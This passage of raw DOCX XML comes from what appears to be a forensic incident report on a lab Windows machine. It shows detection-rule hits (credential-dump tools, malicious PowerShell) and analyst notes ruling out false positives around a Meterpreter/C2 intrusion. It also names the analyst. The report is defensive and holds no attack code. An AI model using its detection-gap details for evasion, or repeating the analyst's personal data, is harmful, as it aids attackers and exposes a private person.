            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929217</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76</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929217</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ScriptBlock</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4104</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>76</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#237</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929910</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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77</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.929910</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Malicious PowerShell Commandlets - PoshModule</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-PowerShell/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4103</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>77</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#238</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:42.351000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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Sysmon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3047</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#4774</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:42.351351</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3047</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#28</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:42.351351</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3047</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#411</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:53.866000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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Sysmon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#4775</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:53.866909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 11:51:53.866909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Cred Dump Tools Dropped Files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-Sysmon/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>3076</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#412</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix C: Working notes (leads ruled out, false positives)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 2] Step 2 alert triage — false positives / context: (1) 'Cred Dump Tools Dropped Files' 11:51:42/11:51:53 = procdump64.exe/procdump.exe copied by Explorer into Desktop\Tools\Forensic_Program_Files\SysinternalsSuite (analyst toolkit, FP). (2) 'Suspicious Service Path' (Printer Extensions, VMware SVGA Helper) = OS/VMware Tools install, FP. (3) 'User Added To Local Admin Grp' / 'Password Reset By Admin' 2023-11-09 = OOBE account creation (SIDs -1000/-1001), FP. (4) 'Suspicious Paths Service Installation' / 'Sysmon Configuration Change' / 'WMI Persistence' (SCM Event Provider 10:51:11) = Sysmon/VMware install, lab setup. (5) 'Proc Injection'/'Remote Thread in Shell Application' 10:55:29 (SrcPID 504 → powershell 7396, StartFunction CtrlRoutine in kernelbase) = console Ctrl+C handler, benign FP. (6) 'Hidden Executable In ADS' / 'Suspicious ADS File' = Zone.Identifier of Firefox/Edge downloads (NDP452, windowsdesktop-runtime-6.0.24, 7z2301), FP. (7) Autorun keys = OneDriveSetup RunOnce and .NET runtime burn RunOnce, FP. (8) Net Conn alerts = OneDrive, EdgeUpdate, KAPE/gkape, TimelineExplorer (analyst/system). (9) 'Usage Of Web Request' 11:21:30 + 'Set-ExecutionPolicy unrestricted' 11:21:23 = Get-KAPEUpdate.ps1 (analyst). hash_hits: no hash list loaded (hashset empty) — no conclusion possible from absence of match.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 3] Step 3 noise excluded: VMware Tools, VC++ redist, Firefox 119 installer, OneDrive/EdgeWebView2 updates (11:13–11:16), Defender platform update (10:52), Sysmon install (10:50–10:51), KAPE/gkape, TimelineExplorer, 7-Zip 23.01 install (12:30), NDP452 web installer (11:38) – lab setup / analyst tooling. ipconfig (10:09:04) and gps/get-service in PSReadLine are operator lab actions prior to detonation. No Amcache/BAM record for pscp.exe (not exhaustive). Sysmon EID 3 for pscp.exe/explorer 7324 C2 session not logged (only powershell 736 → 10.0.0.12 at 11:10:55); C2 port to be determined in the network step.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 4] Step 4 persistence, ruled out as false positives:</w:t>
        <w:br/>
        <w:t>- OneDrive self-update (OneDrive.exe → OneDriveSetup.exe /update /restart /updateSource:ODU) at 2023-11-10 11:13:46–11:13:58 UTC. It wrote the HKCU RunOnce cleanup entries, the HKCU Run OneDrive and Microsoft Edge Update entries, 31 HKCU CLSID registrations, the OneDrive Standalone Update Task and the MicrosoftEdgeUpdateTaskUser Core/UA tasks. Its ancestry is legitimate, separate from the Meterpreter chain.</w:t>
        <w:br/>
        <w:t>- Defender tasks (11:03:03) come from a platform update; the Firefox tasks (10:25:49) come from the Firefox install.</w:t>
        <w:br/>
        <w:t>- The WMI 5861 "SCM Event Log Filter" binding is a Windows default.</w:t>
        <w:br/>
        <w:t>- The Sysmon 13 ImagePath writes at 10:52:42 are services.exe updating the Defender services.</w:t>
        <w:br/>
        <w:t>- 7045 entries cover VMware Tools, Mozilla Maintenance, Sysmon and WPD (lab setup).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 6] Step 6 ruled-out leads: (1) WinRM/Operational 145/142/161/254 'Enumeration' of the local listener with error 2150858770 recur at every boot from 2023-11-09; this is benign WinRM service behaviour, not remote PowerShell. (2) PsExec.exe/PsExec64.exe under Desktop\Tools\...\SysinternalsSuite and the AnyDesk/TeamViewer/ScreenConnect/Splashtop/Atera .tkape/.map files belong to the analyst toolset (created 10:46–12:16) and never ran. (3) SMBServer 1010/1025/1027 and SmbClient 30810–30812 are transport binding events at boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 7] Step 7 context, not findings:</w:t>
        <w:br/>
        <w:t>- PowerShell transcription is enabled (C:\Transcript\20231110). Transcripts PowerShell_transcript.DESKTOP-KJ81A5A.4_WbZ_YN.20231110030640.txt (11:06:40, 12,506 B; this lines up with the MSFConsole PowerShell host in injected explorer 7324) and ._h_Jx2Ns.20231110030910.txt (11:09:10–11:11:19, 10,284 B; lines up with powershell 736, the 1.exe download) are on disk (MFT 90502 / 90505), but their content was not parsed into the database. Review them offline.</w:t>
        <w:br/>
        <w:t>- The user's own transcript c4CYCMv_ (10:55:34) was deleted to the Recycle Bin at 10:56:07 ($RX8NRQ1.txt). Desktop\sysmon-config.xml (0 B) was recycled at 10:28:22. Both are lab setup activity.</w:t>
        <w:br/>
        <w:t>- Samsung T7 E: ShellBag 'E:\iphone files' (10:47:54) and Desktop\Tools, kape and Forensic_Program_Files ShellBags/LNK/Jump Lists are analyst tooling.</w:t>
        <w:br/>
        <w:t>- Thumbcache, WordWheelQuery (12:27, analyst) and Downloads\NDP452-KB2901954-Web.exe (11:38:51, .NET installer for tooling) show nothing related to the attack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 8] Step 8 – benign web activity (lab setup / analyst preparation, not findings): Edge searches 'download sysmon', 'swift on security sysmon config', 'download firefox' (10:23–10:25); Firefox searches 'download kape' (10:39), 'download winpmem' (10:46, winpmem_mini_x64_rc2.exe downloaded 10:47:15), 'turn on pwershell logging' (10:52), 'install .net 4.5.2' (11:38, NDP452-KB2901954-Web.exe downloaded). Firefox form history holds the Kroll KAPE download form (Marcus Edmondson, USMC, Security Analyst, e-mail) = analyst identity, PII. login.live.com OAuth entries at 11:13:56 relate to the OneDrive self-update. No attacker-intent searches, no Chromium/Chrome profile, no e-mail client artefacts in the collection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 9] Step 9, ruled out as anti-forensics:</w:t>
        <w:br/>
        <w:t>- wevtutil uninstall-manifest/install-manifest at 10:52:42 is child of MsMpEng (Defender platform update 4.18.23100.2009-0).</w:t>
        <w:br/>
        <w:t>- Sysmon 12 DeleteKey on WINEVT\Channels\Windows Defender/* is the same update.</w:t>
        <w:br/>
        <w:t>- 1102/104 events come from non-Eventlog providers.</w:t>
        <w:br/>
        <w:t>- 4616/Kernel-General 1 happen only at OOBE on 2023-11-09.</w:t>
        <w:br/>
        <w:t>- SI&lt;FN files are VC++ redist, VMware Tools, .NET 6 and KAPE.</w:t>
        <w:br/>
        <w:t>- Sysmon EID 2 is the NDP452 web installer.</w:t>
        <w:br/>
        <w:t>- The deleted transcript (c4CYCMv_, 10:55:34) and sysmon-config.xml in the Recycle Bin are lab setup before the 11:03 execution.</w:t>
        <w:br/>
        <w:t>- Windows\Temp tw-/tpm-*.tmp deletions at 11:07:14 are Windows Update servicing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 10] Step 10 ruled-out leads: archives created 2023-11-10 (Sysmon[1].zip Edge cache, MSEDGE.7z Edge update, Appraiser cab, Desktop\Tools analyst archives) = lab/system; BITS jobs (Font Download, PreSignInSettingsConfigJSON, UpdateBinary OneDriveSetup, WebView2Bootstrapper, Edge installer) = Microsoft; Sysmon 3 from OneDrive/SharePoint/EdgeUpdate/Akamai and KAPE/gkape/powershell 5300 (s3-1.amazonaws.com, KAPE sync) = vendor/analyst; firewall 2004 Firefox rules = install. raw.odl / OneDrive SyncEngine DB not parsed – OneDrive only self-updated, no evidence of sync of user data. No 7-Zip history table, no rclone.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[step 11] Step 11 time-consistency check: Sysmon 1 (11:03:09.903) vs Prefetch PSCP.EXE last run (11:03:09.900) agree within 3 ms; Prefetch of tracert/quser/tasklist/netstat/whoami/net1 match Sysmon 1 times; SRUM timestamps are hourly/minute interval ends (expected later). WebCache/Defender/USN times for the downloads (10:16–10:20) agree to the second. Only clock anomaly: OOBE 2023-11-09 18:58–19:00 offset (4616 during setup, pre-attack). Machine TZ Pacific (bias 480): 11:03 UTC = 03:03 local. 2026-10-19 timestamps (LNK, SRUM filenames) are copy artefacts. No timestomping on attack files (step 9).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix E: Artifact coverage</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2835"/>
        <w:gridCol w:w="1417"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Mapping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>First (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>484855</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1983-08-07 09:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:33:26.066027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
